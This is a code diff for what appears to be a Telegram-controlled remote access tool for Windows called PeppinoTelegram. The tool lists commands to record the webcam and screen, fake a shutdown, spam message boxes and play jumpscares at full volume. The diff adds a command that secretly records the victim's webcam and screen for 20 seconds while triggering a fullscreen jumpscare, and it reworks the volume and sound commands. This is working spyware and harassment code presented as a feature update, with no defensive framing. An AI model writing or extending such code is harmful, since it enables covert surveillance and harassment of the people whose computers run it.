@@ -27,6 +27,7 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 try:
     from winsound import PlaySound, SND_FILENAME, SND_ASYNC
 except ImportError:
+    print("SOUNDS ARE NOT PLAYABLE")
     PlaySound = lambda *args:args
     SND_FILENAME = None
 
@@ -127,6 +128,7 @@ plankton - Plankton.
 gabinetti - Gabinetti nella villa.
 webcamclip - Record webcam.  
 screenclip - Record screen.  
+recordjum - Records 20 second clip of jumpscare.
 messagebox - Show a custom message box.  
 messagespam - Spam message boxes.  
 fakeshutdown - Fake system shutdown.  
@@ -565,11 +567,12 @@ class PeppinoTelegram:
             "distortedscreen":self.distorted_screen,
             "fullclip":self.record_webcam_and_screen,
             "duckyhelp":lambda: self.bsend(self.duckyhelp),
-            "setvolume":self.audio_mixer.setVolumePercentage,
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
+            "recordjum":self.record_jumpscare_reaction,
+            "mutevolume":lambda:self.audio_mixer.mute(),
+            "setvolume":self.audio_mixer.setVolumePercentage,
+            "fullvolume":lambda:self.audio_mixer.full(),
             "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
-            "mute":lambda:self.audio_mixer.mute(),
-            "full":lambda:self.audio_mixer.full()
         }
         self.no_background_functions = [self.message_box, self.spam_windows]
     
@@ -582,7 +585,7 @@ class PeppinoTelegram:
             return self.bsend(f"Error while sending an image\n{e}")
     
     def __playsound(self, audio: str) -> None:
-        PlaySound(audio, SND_FILENAME)
+        PlaySound(audio, SND_FILENAME | SND_ASYNC)
     
     def __play_loaded_sound(self, audio: str) -> None:
         self.__playsound(self.audios[audio])
@@ -977,7 +980,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
 
     def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True) -> None:
         old_volume = self.audio_mixer.getVolumePercentage()
-        self.audio_mixer.setVolumePercentage(100)
+        self.audio_mixer.full()
         if image is None:
             image = self.images[choice(list(self.images.keys()))]
         else:
@@ -987,16 +990,27 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         else:
             audio = self.audios[audio]
         imageThread = Thread(target=show_image_fullscreen ,args=(image,))
-        audioThread = Thread(target=PlaySound, args=(audio,SND_FILENAME,SND_ASYNC))
-        if playaudio:
-            audioThread.start()
+
         if showimage:
             imageThread.start()
         if playaudio:
-            audioThread.join()
+            self.__playsound(audio)
         if showimage:
             imageThread.join()
         self.audio_mixer.setVolumePercentage(old_volume)
+
+
+    def record_jumpscare_reaction(self, onlycamera=False) -> None:
+        if onlycamera:
+            recording_thread = Thread(target=self.record_webcam, args=(20,))
+        else:
+            recording_thread = Thread(target=self.record_webcam_and_screen, args=(20,))
+
+        recording_thread.start()
+        sleep(7)
+        self.jumpscare(playaudio=True)
+        recording_thread.join()
+
     
     def plankton(self) -> None:
         self.jumpscare("plankton", "plankton")
